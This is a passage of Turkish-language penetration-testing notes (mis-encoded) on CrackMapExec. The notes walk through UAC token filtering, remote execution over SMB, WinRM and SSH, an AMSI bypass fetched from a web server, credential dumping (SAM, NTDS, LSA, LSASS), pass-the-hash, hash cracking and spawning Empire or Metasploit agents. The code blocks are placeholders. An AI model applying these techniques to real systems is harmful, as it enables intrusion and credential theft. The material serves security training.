Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

